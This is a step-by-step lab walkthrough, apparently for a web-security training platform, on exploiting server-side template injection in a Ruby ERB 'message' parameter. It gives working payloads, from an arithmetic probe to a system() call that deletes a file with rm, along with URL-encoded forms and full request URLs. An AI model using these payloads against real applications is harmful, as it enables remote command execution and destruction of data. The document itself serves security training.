# Exploiting Basic Server-Side Template Injection

This guide delivers a clear, creative, and organized walkthrough to exploit a **Server-Side Template Injection (SSTI)** vulnerability in a web application. Imagine yourself as a digital wizard, weaving malicious code into the server’s template engine to cast a destructive spell! The objective is to identify and exploit an SSTI vulnerability in the `message` parameter, execute arbitrary system commands, and delete the file `/home/carlos/morale.txt` to solve the lab.

## Objective
Inject malicious ERB template code into the `message` parameter to confirm SSTI, then use the Ruby `system()` method to execute a command that deletes `carlos`’s file, solving the lab.

## Prerequisites
- Burp Suite with Proxy configured (optional for monitoring requests).
- Access to the lab application with a homepage and product details feature.
- Basic understanding of server-side template injection, ERB syntax, and Ruby commands.
- Familiarity with URL encoding for payloads.

## Background on the Vulnerability
The application uses the `message` parameter in a `GET` request to dynamically render content (e.g., "Unfortunately this product is out of stock") via an ERB (Embedded Ruby) template engine. Lack of input sanitization allows attackers to inject ERB syntax (e.g., `<%= expression %>`), which the server evaluates, enabling code execution. Using Ruby’s `system()` method, attackers can run arbitrary operating system commands, such as deleting files.

## Steps to Solve the Lab

### Step 1: Identify the Vulnerable Parameter
1. Open the lab in the browser and click "View details" on the first product.
2. **Observation**: The homepage renders the message "Unfortunately this product is out of stock" via a `GET` request with a `message` parameter, e.g.:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?message=Unfortunately+this+product+is+out+of+stock
   ```

### Step 2: Test for Template Injection
1. Research ERB syntax in the [official ERB documentation](https://ruby-doc.org/stdlib/libdoc/erb/rdoc/ERB.html).
2. **Observation**: The syntax `<%= someExpression %>` evaluates an expression and renders the result.
3. Create a test payload with a mathematical operation:
   ```
   <%= 7*7 %>
   ```
4. URL-encode the payload:
   - `<` → `%3C`
   - `%` → `%25`
   - `=` → `%3D`
   - `>` → `%3E`
   - Space → `+`
   - Encoded payload: `%3C%25%3D+7*7+%25%3E`
5. Construct the URL:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?message=%3C%25%3D+7*7+%25%3E
   ```
6. Load the URL in the browser.
7. **Observation**: The homepage renders `49`, confirming that the `message` parameter is evaluated as ERB code, indicating an SSTI vulnerability.

### Step 3: Research Command Execution
1. Consult the [Ruby documentation](https://ruby-doc.org/core/Kernel.html#method-i-system) to identify the `system()` method, which executes operating system commands.
2. **Observation**: `system("command")` runs shell commands, such as `rm` to delete files.

### Step 4: Craft the Malicious Payload
1. Create a payload to delete `/home/carlos/morale.txt`:
   ```
   <%= system("rm /home/carlos/morale.txt") %>
   ```
2. URL-encode the payload:
   - `<` → `%3C`
   - `%` → `%25`
   - `=` → `%3D`
   - `>` → `%3E`
   - `"` → `%22`
   - `/` → `%2F`
   - Space → `+`
   - Encoded payload: `%3C%25%3D+system(%22rm+%2Fhome%2Fcarlos%2Fmorale.txt%22)+%25%3E`
3. Construct the final URL:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?message=%3C%25%3D+system(%22rm+%2Fhome%2Fcarlos%2Fmorale.txt%22)+%25%3E
   ```

### Step 5: Execute the Exploit
1. Load the crafted URL in the browser.
2. **Observation**: The server executes the `rm` command, deleting `/home/carlos/morale.txt`, solving the lab.

### Step 6: Verify Success
1. If the lab does not confirm completion, verify:
   - The URL uses the correct lab ID and encoded payload.
   - The payload syntax matches `<%= system("rm /home/carlos/morale.txt") %>`.
   - The response indicates successful execution (e.g., no error or lab completion).
2. **Observation**: Successful deletion of the file completes the lab.